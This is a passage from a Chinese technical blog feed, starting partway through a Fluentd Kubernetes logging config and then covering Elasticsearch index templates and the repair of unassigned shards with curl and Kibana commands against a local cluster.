class="line">  <span class="string">key_name</span> <span class="string">log</span>                <span class="comment"># 在要解析的记录中指定字段名称。</span></span><br><span class="line">  <span class="string">reserve_data</span> <span class="literal">true</span>           <span class="comment"># 在解析结果中保留原始键值对。</span></span><br><span class="line">  <span class="string">remove_key_name_field</span> <span class="literal">true</span>  <span class="comment"># key_name 解析成功后删除字段。</span></span><br><span class="line">  <span class="string">&lt;parse&gt;</span></span><br><span class="line">    <span class="string">@type</span> <span class="string">multi_format</span></span><br><span class="line">    <span class="string">&lt;pattern&gt;</span></span><br><span class="line">      <span class="string">format</span> <span class="string">json</span></span><br><span class="line">    <span class="string">&lt;/pattern&gt;</span></span><br><span class="line">    <span class="string">&lt;pattern&gt;</span></span><br><span class="line">      <span class="string">format</span> <span class="string">none</span></span><br><span class="line">    <span class="string">&lt;/pattern&gt;</span></span><br><span class="line">  <span class="string">&lt;/parse&gt;</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#多行日志拼接，主要针对pod日志超过docker 16k限制的大日志</span></span><br><span class="line"><span class="string">&lt;filter</span> <span class="string">kubernetes.**&gt;</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">concat</span></span><br><span class="line">  <span class="string">key</span> <span class="string">message</span></span><br><span class="line">  <span class="string">separator</span> <span class="string">""</span></span><br><span class="line">  <span class="string">multiline_start_regexp</span> <span class="string">/^\[\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;</span> <span class="string">\d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;.\d&#123;3&#125;\]/</span></span><br><span class="line">  <span class="string">multiline_end_regexp</span> <span class="string">/\n$/</span>     <span class="comment">#需要匹配结束特征，否则遇到带有大日志的文件时会质押最后一条日志</span></span><br><span class="line">  <span class="string">flush_interval</span> <span class="number">10</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#添加k8s相关的元数据，pod namespace id 等</span></span><br><span class="line"><span class="string">&lt;filter</span> <span class="string">kubernetes.**&gt;</span></span><br><span class="line">  <span class="string">@id</span> <span class="string">filter_kubernetes_metadata</span></span><br><span class="line">  <span class="string">@type</span> <span class="string">kubernetes_metadata</span></span><br><span class="line"><span class="string">&lt;/filter&gt;</span></span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; class=&quot;headerlink&quot; title=&quot;问题描述&quot;&gt;&lt;/a&gt;问题描述&lt;/h2&gt;
      
    
    </summary>
    
    
      <category term="Fluentd" scheme="http://chenzhonzhou.github.io/categories/Fluentd/"/>
    
    
      <category term="Fluentd" scheme="http://chenzhonzhou.github.io/tags/Fluentd/"/>
    
  </entry>
  
  <entry>
    <title>Elasticsearch索引模板Template</title>
    <link href="http://chenzhonzhou.github.io/2021/01/31/elasticsearch-suo-yin-mo-ban-template/"/>
    <id>http://chenzhonzhou.github.io/2021/01/31/elasticsearch-suo-yin-mo-ban-template/</id>
    <published>2021-01-31T10:02:56.000Z</published>
    <updated>2021-08-26T02:09:18.063Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h2 id="一、模板简述"><a href="#一、模板简述" class="headerlink" title="一、模板简述"></a>一、模板简述</h2><p>template大致分成setting和mappings两部分：</p><p>索引可使用预定义的模板进行创建，这个模板称作<code>Index templates</code>。模板设置包括<strong>settings</strong>和<strong>mappings</strong>，通过模式匹配的方式使得多个索引重用一个模板。</p><ol><li><p>settings主要作用于index的一些相关配置信息，如分片数、副本数，tranlog同步条件、refresh等。</p></li><li><p>mappings主要是一些说明信息，大致又分为_all、_source、prpperties这三部分：</p><p>(1)_all：主要指的是AllField字段，我们可以将一个或多个都包含进来，在进行检索时无需指定字段的情况下检索多个字段。设置<code>&quot;_all&quot; : {&quot;enabled&quot; : true}</code><br>(2) _source：主要指的是SourceField字段，Source可以理解为ES除了将数据保存在索引文件中，另外还有一份源数据。_source字段在我们进行检索时相当重要，如果在{“enabled” : false}情况下默认检索只会返回ID， 你需要通过Fields字段去到索引中去取数据，效率不是很高。但是enabled设置为true时，索引会比较大，这时可以通过Compress进行压缩和inclueds、excludes来在字段级别上进行一些限制，自定义哪些字段允许存储。<br>(3) properties：这是最重要的步骤，主要针对索引结构和字段级别上的一些设置。</p></li><li><p>咱们通常在elasticsearch中 post mapping信息，每重新创建索引便到设置mapping，分片，副本信息。非常繁琐。强烈建议大家通过设置template方式设置索引信息。设置索引名，通过正则匹配的方式匹配到相应的模板。</p><blockquote><p>直接修改mapping的优先级&gt;索引template。索引匹配了多个template，当属性等配置出现不一致的，以order的最大值为准，order默认值为0</p></blockquote></li></ol><h2 id="二、模板管理"><a href="#二、模板管理" class="headerlink" title="二、模板管理"></a>二、模板管理</h2><h3 id="2-1-创建-修改模板"><a href="#2-1-创建-修改模板" class="headerlink" title="2.1 创建/修改模板"></a>2.1 创建/修改模板</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">PUT /_template/template_1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"template"</span>: <span class="string">"pmall*"</span>,</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"index.number_of_shards"</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">"number_of_replicas"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"similarity"</span>: &#123;</span><br><span class="line">      <span class="attr">"IgnoreTFSimilarity"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"IgoreTFSimilarity"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"_default_"</span>: &#123;</span><br><span class="line">      <span class="attr">"_source"</span>: &#123;</span><br><span class="line">        <span class="attr">"enabled"</span>: <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"commodity"</span>: &#123;</span><br><span class="line">      <span class="attr">"properties"</span>: &#123;</span><br><span class="line">        <span class="attr">"sold"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"long"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"online_time"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"long"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"price"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"long"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"publish_time"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"long"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"id"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"long"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"catecode"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"integer"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"title"</span>: &#123;</span><br><span class="line">          <span class="attr">"search_analyzer"</span>: <span class="string">"ikSmart"</span>,</span><br><span class="line">          <span class="attr">"similarity"</span>: <span class="string">"IgnoreTFSimilarity"</span>,</span><br><span class="line">          <span class="attr">"analyzer"</span>: <span class="string">"ik"</span>,</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"text"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"content"</span>: &#123;</span><br><span class="line">          <span class="attr">"index"</span>: <span class="literal">false</span>,</span><br><span class="line">          <span class="attr">"store"</span>: <span class="literal">true</span>,</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"status"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"integer"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-删除模板"><a href="#2-2-删除模板" class="headerlink" title="2.2 删除模板"></a>2.2 删除模板</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE /_template/template_1</span><br></pre></td></tr></table></figure><h3 id="2-3-查看模板"><a href="#2-3-查看模板" class="headerlink" title="2.3 查看模板"></a>2.3 查看模板</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /_template/template_1</span><br></pre></td></tr></table></figure><p>也可以通过模糊匹配得到多个模板信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /_template/temp*</span><br></pre></td></tr></table></figure><p>可以批量查看模板</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /_template/template_1,template_2</span><br></pre></td></tr></table></figure><p>验证模板是否存在：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HEAD _template/template_1</span><br></pre></td></tr></table></figure><h3 id="2-4-模板优先级"><a href="#2-4-模板优先级" class="headerlink" title="2.4 模板优先级"></a>2.4 模板优先级</h3><p>多个模板同时匹配，以order顺序倒排，order越大，优先级越高</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PUT /_template/template_1</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"template"</span> : <span class="string">"*"</span>,</span><br><span class="line">    <span class="attr">"order"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"settings"</span> : &#123;</span><br><span class="line">        <span class="attr">"number_of_shards"</span> : <span class="number">1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">        <span class="attr">"type1"</span> : &#123;</span><br><span class="line">            <span class="attr">"_source"</span> : &#123; <span class="attr">"enabled"</span> : <span class="literal">false</span> &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT /_template/template_2</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"template"</span> : <span class="string">"te*"</span>,</span><br><span class="line">    <span class="attr">"order"</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"settings"</span> : &#123;</span><br><span class="line">        <span class="attr">"number_of_shards"</span> : <span class="number">1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">        <span class="attr">"type1"</span> : &#123;</span><br><span class="line">            <span class="attr">"_source"</span> : &#123; <span class="attr">"enabled"</span> : <span class="literal">true</span> &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-5-模板版本号"><a href="#2-5-模板版本号" class="headerlink" title="2.5 模板版本号"></a>2.5 模板版本号</h3><p>模板可以选择添加版本号，这可以是任何整数值，以便简化外部系统的模板管理。版本字段是完全可选的，它仅用于模板的外部管理。要取消设置版本，只需替换模板即可</p><p>创建模板：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT /_template/template_1</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"template"</span> : <span class="string">"*"</span>,</span><br><span class="line">    <span class="attr">"order"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"settings"</span> : &#123;</span><br><span class="line">        <span class="attr">"number_of_shards"</span> : <span class="number">1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"version"</span>: <span class="number">123</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看模板版本号：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /_template/template_1?filter_path=*.version</span><br></pre></td></tr></table></figure><p>响应如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"template_1"</span> : &#123;</span><br><span class="line">    <span class="attr">"version"</span> : <span class="number">123</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-6-修改索引分片和副本数"><a href="#2-6-修改索引分片和副本数" class="headerlink" title="2.6 修改索引分片和副本数"></a>2.6 修改索引分片和副本数</h3><p>修改副本数：对于创建好的索引只能修改副本数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT logstash-2021.01.24/_settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"index"</span> : &#123;</span><br><span class="line">    <span class="string">"number_of_replicas"</span>: <span class="string">"0"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改分片数：建立模板并关联索引</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST _template/template_1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"index_patterns"</span>: [</span><br><span class="line">    <span class="string">"logstash-*"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"settings"</span>: &#123;</span><br><span class="line">    <span class="string">"number_of_shards"</span>: 3,</span><br><span class="line">    <span class="string">"number_of_replicas"</span>: 0</span><br><span class="line">  &#125;,</span><br><span class="line">    <span class="string">"aliases"</span>: &#123;</span><br><span class="line">      <span class="string">"mydata"</span>: &#123; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主分片数据到底多少为宜呢？</p><ul><li>根据节点数来进行分片，3个Node，N*(1.5~3)</li><li>如果有3个节点，主分片数据：5-9个分片</li></ul><p>官方资料参考：<br><a href="https://www.elastic.co/guide/en/elasticsearch/reference/5.4/indices-templates.html" target="_blank" rel="noopener">indices-templates</a></p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;一、模板简述&quot;&gt;&lt;a href=&quot;#一、模板简述&quot; class=&quot;headerlink&quot; title=&quot;一、模板简述&quot;&gt;&lt;/a&gt;一、模
      
    
    </summary>
    
    
      <category term="ElasticSearch" scheme="http://chenzhonzhou.github.io/categories/ElasticSearch/"/>
    
    
      <category term="ElasticSearch" scheme="http://chenzhonzhou.github.io/tags/ElasticSearch/"/>
    
  </entry>
  
  <entry>
    <title>ES出现unassigned_shards解决方法</title>
    <link href="http://chenzhonzhou.github.io/2021/01/24/es-chu-xian-unassigned-shards-jie-jue-fang-fa/"/>
    <id>http://chenzhonzhou.github.io/2021/01/24/es-chu-xian-unassigned-shards-jie-jue-fang-fa/</id>
    <published>2021-01-24T02:47:56.000Z</published>
    <updated>2021-03-24T09:02:07.627Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h3 id="1-查看健康状态信息"><a href="#1-查看健康状态信息" class="headerlink" title="1. 查看健康状态信息"></a>1. 查看健康状态信息</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ curl -XGET http://localhost:9200/_cluster/health\?pretty</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"cluster_name"</span> : <span class="string">"docker-cluster"</span>,</span><br><span class="line">  <span class="attr">"status"</span> : <span class="string">"yellow"</span>,</span><br><span class="line">  <span class="attr">"timed_out"</span> : <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"number_of_nodes"</span> : <span class="number">1</span>,</span><br><span class="line">  <span class="attr">"number_of_data_nodes"</span> : <span class="number">1</span>,</span><br><span class="line">  <span class="attr">"active_primary_shards"</span> : <span class="number">23</span>,</span><br><span class="line">  <span class="attr">"active_shards"</span> : <span class="number">23</span>,</span><br><span class="line">  <span class="attr">"relocating_shards"</span> : <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"initializing_shards"</span> : <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"unassigned_shards"</span> : <span class="number">6</span>,</span><br><span class="line">  <span class="attr">"delayed_unassigned_shards"</span> : <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"number_of_pending_tasks"</span> : <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"number_of_in_flight_fetch"</span> : <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"task_max_waiting_in_queue_millis"</span> : <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"active_shards_percent_as_number"</span> : <span class="number">79.3103448275862</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-找到未分片的索引"><a href="#2-找到未分片的索引" class="headerlink" title="2.找到未分片的索引"></a>2.找到未分片的索引</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s <span class="string">"http://localhost:9200/_cat/shards"</span> | grep UNASSIGNED</span><br><span class="line"><span class="built_in">test</span>                             0 r UNASSIGNED</span><br><span class="line">logstash-2021.01.22              0 r UNASSIGNED</span><br><span class="line">logstash-2021.01.23              0 r UNASSIGNED</span><br><span class="line">logstash-2021.01.18              0 r UNASSIGNED</span><br><span class="line">logstash-2021.01.19              0 r UNASSIGNED</span><br></pre></td></tr></table></figure><h3 id="3-强制分配主分片"><a href="#3-强制分配主分片" class="headerlink" title="3.强制分配主分片"></a>3.强制分配主分片</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先查节点唯一标识</span></span><br><span class="line">$ curl -XGET http://localhost:9200/_nodes/process?pretty</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"_nodes"</span> : &#123;</span><br><span class="line">    <span class="string">"total"</span> : 1,</span><br><span class="line">    <span class="string">"successful"</span> : 1,</span><br><span class="line">    <span class="string">"failed"</span> : 0</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"cluster_name"</span> : <span class="string">"docker-cluster"</span>,</span><br><span class="line">  <span class="string">"nodes"</span> : &#123;</span><br><span class="line">    <span class="string">"NOmRjiA6T3i_plKA340Ong"</span> : &#123;</span><br><span class="line">      <span class="string">"name"</span> : <span class="string">"4abbcb382dc4"</span>,</span><br><span class="line">      <span class="string">"transport_address"</span> : <span class="string">"172.17.0.2:9300"</span>,</span><br><span class="line">      <span class="string">"host"</span> : <span class="string">"172.17.0.2"</span>,</span><br><span class="line">      <span class="string">"ip"</span> : <span class="string">"172.17.0.2"</span>,</span><br><span class="line">      <span class="string">"version"</span> : <span class="string">"7.4.2"</span>,</span><br><span class="line">      <span class="string">"build_flavor"</span> : <span class="string">"default"</span>,</span><br><span class="line">      <span class="string">"build_type"</span> : <span class="string">"docker"</span>,</span><br><span class="line">      <span class="string">"build_hash"</span> : <span class="string">"2f90bbf7b93631e52bafb59b3b049cb44ec25e96"</span>,</span><br><span class="line">      <span class="string">"roles"</span> : [</span><br><span class="line">        <span class="string">"ingest"</span>,</span><br><span class="line">        <span class="string">"master"</span>,</span><br><span class="line">        <span class="string">"data"</span>,</span><br><span class="line">        <span class="string">"ml"</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">"attributes"</span> : &#123;</span><br><span class="line">        <span class="string">"ml.machine_memory"</span> : <span class="string">"2147483648"</span>,</span><br><span class="line">        <span class="string">"xpack.installed"</span> : <span class="string">"true"</span>,</span><br><span class="line">        <span class="string">"ml.max_open_jobs"</span> : <span class="string">"20"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">"process"</span> : &#123;</span><br><span class="line">        <span class="string">"refresh_interval_in_millis"</span> : 1000,</span><br><span class="line">        <span class="string">"id"</span> : 1,</span><br><span class="line">        <span class="string">"mlockall"</span> : <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#强制分配主分片</span></span><br><span class="line">$ curl -XPOST localhost:9200/_cluster/reroute -d <span class="string">'</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    "commands": [</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">           "allocate_replica": &#123;</span></span><br><span class="line"><span class="string">                  "index": "logstash-2021.01.18", </span></span><br><span class="line"><span class="string">                  "shard": 0, </span></span><br><span class="line"><span class="string">                  "node": "NOmRjiA6T3i_plKA340Ong",</span></span><br><span class="line"><span class="string">                  "allow_primary": "true"</span></span><br><span class="line"><span class="string">             &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">     ]</span></span><br><span class="line"><span class="string">&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#或者在kibana页面执行</span></span><br><span class="line">POST _cluster/reroute</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"commands"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="string">"allocate_replica"</span>: &#123;</span><br><span class="line">                  <span class="string">"index"</span>: <span class="string">"logstash-2021.01.18"</span>, </span><br><span class="line">                  <span class="string">"shard"</span>: 0, </span><br><span class="line">                  <span class="string">"node"</span>: <span class="string">"NOmRjiA6T3i_plKA340Ong"</span>,</span><br><span class="line">                  <span class="string">"allow_primary"</span>: <span class="string">"true"</span></span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">     ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#批量处理的脚本(当数量很多时, 注意替换node的名字)</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> $(curl  -s <span class="string">'http://localhost:9200/_cat/shards'</span> | grep UNASSIGNED | awk <span class="string">'&#123;print $1&#125;'</span> | sort | uniq); <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> shard <span class="keyword">in</span> $(curl  -s <span class="string">'http://localhost:9200/_cat/shards'</span> | grep UNASSIGNED | grep <span class="variable">$index</span> | awk <span class="string">'&#123;print $2&#125;'</span> | sort | uniq); <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span>  <span class="variable">$index</span> <span class="variable">$shard</span></span><br><span class="line"></span><br><span class="line">        curl -XPOST <span class="string">'localhost:9200/_cluster/reroute'</span> -d <span class="string">"&#123;</span></span><br><span class="line"><span class="string">            'commands' : [ &#123;</span></span><br><span class="line"><span class="string">                  'allocate' : &#123;</span></span><br><span class="line"><span class="string">                      'index' : <span class="variable">$index</span>,</span></span><br><span class="line"><span class="string">                      'shard' : <span class="variable">$shard</span>,</span></span><br><span class="line"><span class="string">                      'node' : 'Master',</span></span><br><span class="line"><span class="string">                      'allow_primary' : true</span></span><br><span class="line"><span class="string">                  &#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            ]</span></span><br><span class="line"><span class="string">        &#125;"</span></span><br><span class="line"></span><br><span class="line">        sleep 5</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="4-删除该索引"><a href="#4-删除该索引" class="headerlink" title="4.删除该索引"></a>4.删除该索引</h3><p>如果这个index 已经不用了，直接删除 index，这些 unassigned 的分片也会被干掉，集群恢复正常</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -XDELETE localhost:9200/logstash-2021.01.18</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h3 id=&quot;1-查看健康状态信息&quot;&gt;&lt;a href=&quot;#1-查看健康状态信息&quot; class=&quot;headerlink&quot; title=&quot;1. 查看健康
      
    
    </summary>
    
    
